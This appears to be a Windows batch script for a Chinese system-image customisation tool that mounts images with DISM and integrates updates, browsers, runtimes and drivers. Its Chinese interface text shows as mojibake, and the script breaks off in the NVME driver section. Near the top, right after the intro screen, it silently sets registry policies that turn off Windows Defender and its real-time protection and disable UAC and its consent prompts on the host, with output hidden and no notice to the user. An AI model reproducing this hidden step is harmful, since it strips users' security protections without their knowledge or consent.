@echo off&color 0A&mode con cols=80 lines=32&setlocal EnableDelayedExpansion&set "+=LAzaHebKiyIOJWfPQcgrXBFjsGVumRvNnZCSdxotYEMDpqkUhlwT"& set "-=%~dp0"
call :ImDisk


set "+=JKMDXYEBFPQGNHLAUVWZCIORSTrstdxcpqjkmyzauvMDAZqwioYu"
set "length="
for /f "skip=1 delims=:" %%w in ('^(echo."!-!"^&echo.^)^|findstr /o ".*"') do set /a "length=%%w-7"
if /i "!-:~-2,1!" neq "!-:~%length%,1!" cls&&echo.&&echo.������·���������ģ�����ܻᵼ��ĳЩ���ܲ��������밴������˳���������·��...&&pause>nul&&goto :End
"!Windir!\System32\FLTMC.exe" >nul 2>nul || cls && echo. && echo.���Թ���Ա������б����ߣ��밴������˳�.....&&pause>nul&&goto :End
cls&echo.
echo.    _______________________________ ʹ����֪ _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows-�������Ϲ��ߣ���������������谲װϵͳ���������֪ʶ����   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �����Ϳ��Եõ�һ��ǿ���ϵͳ����֧�� Windows 7 8 10 �乤��ԭ���   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ǰ�ӳ���ѹ����Ȼ����һЩ�޸ĺ����±�����µ�ӳ�񡣺ô��ǲ���Ҫ��   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ϵͳ��װ������������̣��������������Ҳ��������ʧ�ܡ�               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ������ʹ����֪���б�Ҫ�ȿ�һ�¡�                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   1���˹����ڵ������ļ����ļ��ж���Ҫ��������                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   2���˹�������·����ò�Ҫ�����ո񣬲�Ҫ�������ļ��С�                ^|
echo.   ^|                                                                        ^|
echo.   ^|   3����ý��˹��߷���SSDӲ�̣����غͱ���ϵͳ�ٶȻ���졣               ^|
echo.   ^|                                                                        ^|
echo.   ^|   4�������������������볢���˳����Թܼ�360֮��������                 ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo. & echo.^>^>^>^>^>^>^>�밴���������...
pause>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f >nul 2>nul

:begin
pushd "!-!"
set "Sysprep="
set "SysprepPath="
set "Scripts="
set "ScriptsPath="
set "AppleSSD="
set "ScriptsLog="
set "Version="
set "Bit="
set "ToolsPath="
set "Dism="
set "HOST_Language="
set "ProductName="
set "IeVersion="
set "Cmd="
set "MountBit="
SET "ImageBuild="
SET "ImageFlag="
SET "ReleaseId="
SET "Component="
set "Sysprep=Mount\Windows\Sysprep"
set "SysprepPath=%%windir%%\Sysprep"
set "Scripts=Mount\Windows\Setup\Scripts"
set "ScriptsPath=%%windir%%\Setup\Scripts"
set "ScriptsLog=Mount\Windows\Logs\ScriptsLog"
if /i !PROCESSOR_ARCHITECTURE! equ AMD64 (set "ToolsPath=File\Bin\x64"&set "Dism=File\Bin\x64\DISM\dism.exe") else (set"ToolsPath=File\Bin\x86"&set "Dism=File\Bin\x86\DISM\dism.exe")
if not exist "Mount\Windows\System32\config\software" goto :menu1
"!Dism!" /English /Get-MountedImageInfo:"Mount"|find /i "Status : Ok" >nul 2>nul&&goto :menu2||"!Dism!" /Remount-Image /MountDir:"Mount" >nul 2>nul&&goto :menu2

:menu1
cls&mode con cols=80 lines=30&title CMD-Windows���Ϲ���-2.9.2
echo.
echo.    _______________________________ ���Ϲ��� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����ӳ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ��׽ӳ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] ж��ӳ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] ��ʽת��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] ӳ��༭                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] ����ĸ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [7] Windows ϵͳ�Ż�                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [8] ��ؽ̳�                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] �˳�                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12345678X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 9 goto :End
if errorlevel 8 goto :jiaocheng
if errorlevel 7 goto :xitongyouhua
if errorlevel 6 goto :mupan
if errorlevel 5 goto :ImageEdit
if errorlevel 4 goto :Convert
if errorlevel 3 goto :UninstallImage
if errorlevel 2 goto :SaveImage
if errorlevel 1 goto :MountImage

:menu2
cls&mode con cols=80 lines=30&title CMD-Windows���Ϲ���-2.9.2
reg query HKLM\ZTM >nul 2>nul||reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
echo.
echo.    _______________________________ ���Ϲ��� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����ӳ��   [G] ת�����ϲ˵�                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ��׽ӳ��   [L] ת������˵�                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] ж��ӳ��   ע�⣺���Ϻ;�����ͬʱ����                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] ��ʽת��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] ӳ��༭                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] ����ĸ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [7] ��ؽ̳�                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] �˳�                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1234567GLX /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 10 goto :End
if errorlevel 9 goto :RemoveMenu
if errorlevel 8 goto :menu3
if errorlevel 7 goto :jiaocheng
if errorlevel 6 goto :mupan
if errorlevel 5 goto :ImageEdit
if errorlevel 4 goto :Convert
if errorlevel 3 goto :UninstallImage
if errorlevel 2 goto :SaveImage
if errorlevel 1 goto :MountImage

:menu3
cls&mode con cols=80 lines=44&title �������ϲ˵�
reg query HKLM\ZTM >nul 2>nul||reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
if exist "Mount\Windows\SysWOW64" (set "Bit=64") else (set "Bit=86")
for /f "tokens=4 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName"') do (set "Version=%%i")
if /i "!Version!"=="10" for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"') do (set "ReleaseId=%%i")
set "AppPath="
set "Item="
set "goto="
echo.       
echo.    _______________________________ ���ϲ˵� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [A] ��װ����                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [B] �����������IE-11��Chromium�ں�Edge                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [C] �������п�                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [D] ��������                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [E] �����Զ�����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [F] �Զ���������Ӧ�ó��� (֧�־�Ĭ����)                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [G] �Ż�ϵͳ                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [H] ����CMD-PE (�㽫�õ�һ����װ������ϵͳ����)                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [I] ����Compact OS (�����Ͳ���ϵͳ)                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [J] OEM��Ϣ����                                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [K] IE�������ҳ����                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [L] Windows��������                                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [M] �ر�Windows�κη���                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [N] �����Զ�����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [O] ���ƻ�������Ż� (�Զ���������װBootCamp������ɵ��ʽ���������)  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [P] ��������ֵ���Զ���װ                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|       ������¼������^<������־.log^>                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:ABCDEFGHIJKLMNOPX /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 17 goto :begin
if errorlevel 16 goto :input16
if errorlevel 15 goto :input15
if errorlevel 14 goto :input14
if errorlevel 13 goto :input13
if errorlevel 12 goto :input12
if errorlevel 11 goto :input11
if errorlevel 10 goto :input10
if errorlevel 9 goto :input9
if errorlevel 8 goto :input8
if errorlevel 7 goto :input7
if errorlevel 6 goto :input6
if errorlevel 5 goto :input5
if errorlevel 4 goto :input4
if errorlevel 3 goto :input3
if errorlevel 2 goto :input2
if errorlevel 1 goto :input1

:input1
cls&mode con cols=80 lines=30
title ��װWindows!Version!_x!Bit!����
set "Item=��װWindows!Version!_x!Bit!����"
set "goto=menu3"
echo.         
echo.    _______________________________ ��װ���� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ֧��.CAB��.MSU��ʽ�Ĳ�����װ��                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ��װ����                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ����Windows7����                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :menu3
if errorlevel 2 goto :DownloadUpdate
if errorlevel 1 goto :UpdateNext

:UpdateNext
cls&echo. 
echo.    _______________________________ ��װ���� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
if /i "!Version!"=="7" echo.   ^|   ��ѡ�����Windows!Version!_x!Bit!�������ļ���                                   ^|
if /i "!Version!"=="10" echo.   ^|   ��ѡ�����Windows!Version!_x!Bit!�������ļ���                                  ^|
if /i "!Version!"=="8" echo.   ^|   ��ѡ�����Windows!Version!_x!Bit!�������ļ���                                   ^|
if /i "!Version!"=="8.1" echo.   ^|   ��ѡ�����Windows!Version!_x!Bit!�������ļ���                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
set "Source="
set /p Source=^>^>^>^>^>^>^>������:
if not defined Source cls&&echo.&&echo.��������Ϊ�գ��밴�����������������...... && pause>nul&&goto :UpdateNext
set "Source=!Source:"=!"
if /i "!Source!" equ "x" goto :input1
if not exist "!Source!" cls&&echo.&&echo.��������"!Source!"��������·�����밴�����������������...... && pause>nul&&goto :UpdateNext
echo "!Source!"|findstr " / * ? < > | "&&cls&&echo.&&echo.���������ʽ����ȷ���밴�����������������...... && pause>nul&&goto :UpdateNext
if /i "!Source:.=!" equ "" cls&&echo.&&echo.���������ʽ����ȷ���밴�����������������...... && pause>nul&&goto :UpdateNext
dir /a-d /b /s "!source!"|findstr /i ".cab .msu">nul 2>nul || cls && echo. && echo.�������·��"!source!\"�ڣ�δ���ֿ��ò����� && echo. && echo.�밴�����������������... && pause>nul && goto :updatenext
cls && echo. && echo.����Ϊwindows!version!_x!bit!��װ���������Ե�...
taskkill /f /im dism++x64.exe >nul 2>nul
taskkill /f /im regedit.exe >nul 2>nul
reg unload hklm\ztm >nul 2>nul
"!dism!" /image:"mount" /add-package /packagepath:"!source!"
reg load hklm\ztm "mount\windows\system32\config\software" >nul 2>nul
call :log & call :achiexe

:DownloadUpdate
if !Version! neq 7 (cls && echo. && echo.�ѹ���ӳ����Windows!Version!_x!Bit!��Ŀǰֻ�ṩWindows7�Ĳ������ء� && echo. && echo.�밴���������... && pause>nul && goto :input1)
if /i "!Bit!"=="64" ( 
	start https://pan.baidu.com/s/1-KmJ1eRsv1wtSUIbxUdfEw & goto :input1
) else (
	start https://pan.baidu.com/s/1-KmJ1eRsv1wtSUIbxUdfEw & goto :input1
)

:input2
cls&mode con cols=80 lines=30&title OEM��Ϣ����
set "Item="
set "goto=input10"
echo.
echo.    ______________________________ ��������� ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����IE�������IE 11                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ����Edge��������°�Chromium�ں�Edge                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :menu3
if errorlevel 2 goto :Edge
if errorlevel 1 goto :IE11

:IE11
cls&mode con cols=80 lines=30&title ����IE�������IE-11&set "Item=����IE�������IE-11"
set "goto=menu3"
if /i not "!Version!"=="7" (cls&&echo.&&echo.�ѹ���ӳ���� Windows !Version! x!Bit!��û�б�Ҫ�ٰ�װIE11��&&echo.&&echo.�밴���������...&&pause>nul&&goto :menu3)
for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Internet Explorer" /v "Version"') do set "IeVersion=%%i"
if /i "!IeVersion:~2,2!"=="11" cls&&echo.&&echo.��ӳ���ڵ�IE������汾��ΪIE11���밴���������...&&pause>nul&&goto :menu3
cls&&echo.&&echo.���ڰ�װ IE11 ����������Ե�...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
"!Dism!" /Image:"Mount" /Add-Package /packagepath:"File\IE11\x!Bit!\Windows6.1-kb2670838-x!Bit!.cab" /packagepath:"File\IE11\x!Bit!\IE-Win7.CAB" /packagepath:"File\IE11\x!Bit!\ielangpack-zh-CN.CAB" /packagepath:"File\IE11\x!Bit!\IE-Hyphenation-en.MSU" /packagepath:"File\IE11\x!Bit!\IE-Spelling-en.MSU" /NoRestart
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
reg query "HKLM\ZTM\Microsoft\Internet Explorer" /v "svcVersion" >nul 2>nul&&call :Log&&call :Achiexe||call :Failure

:Edge
cls&mode con cols=80 lines=30&title ����Edge��������°�Chromium�ں�Edge&set "Item=����Edge��������°�Chromium�ں�Edge"
set "goto=menu3"
set "AppPath=File\Edge\MicrosoftEdgeEnterpriseX!Bit!.msi"

if exist "!AppPath!" (
	copy /v /y "File\Edge\MicrosoftEdgeEnterpriseX!Bit!.msi" "!Scripts!" >nul 2>nul
	echo %%~dp0MicrosoftEdgeEnterpriseX!Bit!.msi /quiet /norestart > "!ScriptsLog!\Edge.log"
) else (
	call :AppPath
)
if exist "!Scripts!\MicrosoftEdgeEnterpriseX!Bit!.msi" (
	if exist "!ScriptsLog!\Edge.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:input3
cls&mode con cols=80 lines=30&title �������п�
set "Apppath="
set "Item="
set "Goto="
for /f "tokens=4 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName"') do (set "Version=%%i")
echo.         
echo.    ______________________________ �������п� ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����.NET_Framework_4.8.4                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ����.NET_Framework_4.8.4_�������԰�                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] ����.NET_Framework_3.5                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] ����VC++���п����°�                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] ����DirectX9���п����հ�                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12345X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 6 goto :menu3
if errorlevel 5 goto :InstallDX9
if errorlevel 4 goto :InstallVC
if errorlevel 3 goto :InstallNet35
if errorlevel 2 goto :InstallNetLanguage
if errorlevel 1 goto :InstallNet48

:InstallNet48
cls&title ����.Net Framework_4.8.4_x!bit!
set "item=����.Net Framework_4.8.4_x!bit!"
set "goto=input3"
if /i "!version!"=="7" (
	cls && echo.&&echo.��������.Net Framework_4.8.4_x!bit!�����Ե�...
	"!toolspath!\7z.exe" -y x "file\net\dotnetfx48_x!bit!.7z" -o"mount" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallNet" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\microsoft.net\framework\v4.0.30319\ndp\" && del /f /q \"!windir!\microsoft.net\framework\v4.0.30319\ndp\"" /f  >nul 2>nul
) else (
	cls&&echo.&&echo.�ѹ��ص�ϵͳ��Windows!version!_x!bit!������Դ���밴���������...&&pause>nul&&goto :input3
)
reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce"|find /i "InstallNet" >nul 2>nul&&call :Log&&call :Achiexe || call :Failure

:InstallNetLanguage
cls
title ����.NET Framework_4.8.4_x!Bit!�������԰�
set "Item=����.NET Framework_4.8.4_x!Bit!�������԰�"
set "goto=input3"
if /i "!Version!"=="7" (
	cls&&echo.&&echo.��������.NET Framework_4.8_x!Bit!�������԰������Ե�...
	"!ToolsPath!\7z.exe" -y x "File\Net\dotNetFx48LP_x!Bit!_CHS.7z" -o"Mount" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallNetLanguage" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\Microsoft.NET\Framework\v4.0.30319\NDPCHS\" && del /f /q \"!windir!\Microsoft.NET\Framework\v4.0.30319\NDPCHS\"" /f >nul 2>nul
) else ( 
	cls&&echo.&&echo.�ѹ��ص�ϵͳ��Windows!Version!_x!Bit!������Դ���밴���������...&&pause>nul&&goto :input3
)
reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce"|find /i "InstallNetLanguage" >nul 2>nul&&call :Log&&call :Achiexe || call :Failure

:InstallNet35
cls
title ����.NET Framework_3.5_x!Bit!
set "Item=����.NET Framework_3.5_x!Bit!"
set "goto=input3"
set "NetTargetFile="
IF /I "!Version!"=="7" (echo.&&echo.�ѹ��ص�ϵͳ��Windows!Version!_x!Bit!������Դ���밴���������...&&pause>nul&&goto :input3)
IF /I "!Bit!"=="64" (set "MountBit=amd64") else (set "MountBit=x86")
if not exist "File\Net\Windows!Version!_x!Bit!_Net3.5\!ReleaseId!\microsoft-windows-netfx3-ondemand-package~31bf3856ad364e35~!MountBit!~~.cab" (
	cls && echo.        
	echo.    ________________________ ����.NET Framework_3.5 ________________________
	echo.   ^|                        ------------------------                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   ��ѡ�����Windows!Version!_x!Bit!��.NET Framework_3.5��װ�����ļ���            ^|
	echo.   ^|                                                                        ^|
		echo.
	set "Source="
	for /f "tokens=*" %%a in ('!ToolsPath!\Wfolder.exe "++" "D:" "��ѡ�����.NET Framework_3.5��װ�����ļ���"') do set "source=%%a"
	if defined source set "source=!source:++ =!"&&set "source=!source:"=!"
	if not defined source goto :input3
	if /i "!Version!"=="10" (
		if not exist "!Source!\microsoft-windows-netfx3-ondemand-package~31bf3856ad364e35~!MountBit!~~.cab" (
			cls&&echo.&&echo.���ļ���"!Source!"�ڲ�δ�����ʺ�Windows!Version!_x!Bit!��.NET Framework_3.5��װ����������ѡ��
			echo.&&echo.�밴���������...&&pause>nul&&goto :InstallNet35
		)	
	)
	set "NetTargetFile=!Source!" 
) else (
	if !Version! equ 10 set "NetTargetFile=File\Net\Windows!Version!_x!Bit!_Net3.5\!ReleaseId!"
)
cls&&echo.&&echo.��������.NET Framework_3.5_x!Bit!�����Ե�...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
set "NetStatus="
"!Dism!" /Image:"Mount" /Enable-Feature /FeatureName:NetFx3 /All /LimitAccess /Source:"!NetTargetFile!"&&set "NetStatus=ok"||(cls&&echo.&&echo.����.NET Framework_3.5_x!Bit!ʧ�ܣ��������Ŀ¼�Ƿ�Ϊ��Ӣ��·�����밴���������...&&pause>nul)
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
if /i "!NetStatus!"=="ok" (call :Log && call :Achiexe) else (call :Failure)

:InstallVC
cls&title ����VC++���п�_x!Bit!
set "Item=����VC++���п�_x!Bit!"
set "goto=input3"
if /i "!Version:~0,1!"=="8" set "Version=10"
cls&&echo.&&echo.��������VC++���п�_x!Bit!�����Ե�...
"!ToolsPath!\7z.exe" -y x "File\VC\MSVBCRT_x!Bit!.7z" -o"Mount" "-xr^!MSVBCRT*" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\VC\MSVBCRT_x!Bit!.7z" "Windows\System32\MSVBCRT!Version!" -o"Mount" >nul 2>nul
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallMSVBCRT" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\System32\MSVBCRT!Version!\" && del /f /q \"!windir!\System32\MSVBCRT!Version!\"" /f >nul 2>nul
reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce"|find /i "InstallMSVBCRT" >nul 2>nul&&call :Log&&call :Achiexe || call :Failure

:InstallDX9
cls&title ����DirectX9���п�_x!Bit!
set "Item=����DirectX9���п�_x!Bit!"
set "goto=input3"
cls&&echo.&&echo.��������DirectX9���п�_x!Bit!�����Ե�...
if /i "!Version!"=="7" (
	"!ToolsPath!\7z.exe" -y x "File\DX9\DirectX9.0c_x!Bit!.7z" -o"Mount" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallDirectX" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\System32\DirectX\" && del /f /q \"!windir!\System32\DirectX\"" /f >nul 2>nul
	reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce"|find /i "InstallDirectX" >nul 2>nul&&call :Log&&call :Achiexe || call :Failure
) else ( 
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	"!Dism!" /Image:"Mount" /Enable-Feature /FeatureName:DirectPlay /All >nul 2>nul
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log
	call :Achiexe
)

:input4
cls&mode con cols=80 lines=30&title ��������
set "AppPath="
set "Item="
set "goto=input4"
echo.        
echo.    _______________________________ �������� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����USB����                                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ����NVME����  (ʹwindows7֧��M.2��̬Ӳ��)                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] ����E3_RAID����                                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] ����KabyLake_RAID����                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] ��������ܲ�                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] �����������                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [7] ����ƻ������                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [8] �����Զ�������                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12345678X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 9 goto :menu3
if errorlevel 8 goto :UserDrives
if errorlevel 7 goto :AppleDrive
if errorlevel 6 goto :EasyDrv
if errorlevel 5 goto :DrvCeonw
if errorlevel 4 goto :KabyLakeRAID
if errorlevel 3 goto :E3RAID
if errorlevel 2 goto :NVME
if errorlevel 1 goto :USB

:UserDrives
cls&title �����Զ�������&set "Item=�����Զ�������"
echo.        
echo.    ______________________________ �Զ������� ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   ������������ļ��С�                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
set "Source="
for /f "tokens=*" %%a in ('!ToolsPath!\Wfolder.exe "++" "D:" "��ѡ������������ļ���"') do set "source=%%a"
if defined source set "source=!source:++ =!"&&set "source=!source:"=!"
if not defined source goto :input4
dir /a-d /b /s "!Source!"|findstr /i ".sys .inf .cat" >nul 2>nul||cls&&echo.&&echo.�������·��"!Source!\"�ڣ�δ���ֿ���������&&echo.&&echo.�밴�������������ѡ��...&&pause>nul&&goto :UserDrives
cls&&echo.&&echo.�������������У����Ե�...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
"!Dism!" /image:"Mount" /add-driver /driver:"!Source!" /Recurse /ForceUnsigned
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
cls&&echo.&&echo.����������ɣ��밴���������...&&pause>nul&&goto :input4

:USB
cls&title ����USB����&set "Item=����USB����"
echo.        
echo.    ______________________________ ����USB���� ______________________________
echo.   ^|                              -------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[1]:ϵͳ����ʱ�����Ӳ�����ܰ�װUSB3.*������                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[2]:��USB3.*������������ӳ��ʹ��ԭ��֧��USB3.*�ӿڡ�           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ���ܰ�װUSB����                                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ����USB������ӳ��                                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��:
if errorlevel 3 goto :input4
if errorlevel 2 goto :UsbToImage
if errorlevel 1 goto :CeoMSX

:CeoMSX
cls&title ����USB����&set "Item=����USB����"
set "AppPath=File\Driver\DrvCeonw.7z"
if /i "!Version!"=="7" (
	if exist "!AppPath!" (
		"!ToolsPath!\7z.exe" -y x "!AppPath!" "DrvCeox!Bit!.exe" "Res" "Win!Version!x!Bit!\MFSET.INI" "Win!Version!x!Bit!\XHCI.7z" "Win!Version!x!Bit!\XHCI.INI" "Win!Version!x!Bit!\XHCI.ScIndex" "Drvceo.ini" -o"!Scripts!\USB" >nul 2>nul
		echo.>>"!Scripts!\USB\Drvceo.ini"
		echo Silence=on>>"!Scripts!\USB\Drvceo.ini"
		ren "!Scripts!\USB\DrvCeox!Bit!.exe" "USB_x!Bit!.exe"
		echo %%~dp0USB\USB_x!Bit!.exe -d ^&^& call "%%ProgramFiles%%\SysCeo\DrvCeo\uninstall.bat" ^&^& rd /s /q "%%ProgramFiles%%\SysCeo" > "!ScriptsLog!\USB.log"
	) else (
		call :AppPath	
	)
) else (
	echo. && echo.���ص�ϵͳ��Windows!Version!_x!Bit!������Դ���밴���������... && pause>nul && goto :input4
)
if exist "!Scripts!\USB\USB_x!Bit!.exe" (
	if exist "!ScriptsLog!\USB.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:UsbToImage
cls&title ����USB����&set "Item=����USB����"
if /i "!Version!"=="7" (
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	"!Dism!" /image:"Mount" /add-driver /driver:"File\USB\x!Bit!" /Recurse /ForceUnsigned
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log & call :Achiexe
) else (
	echo. && echo.���ص�ϵͳ��Windows!Version!_x!Bit!������Դ���밴���������... && pause>nul && goto :input4
)

:NVME
cls&title ����NVME����&set "Item=����NVME����"
if "!Version!"=="7" (
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	cls&&echo.&&echo.���ڰ�װNVME�����У����Ե�...
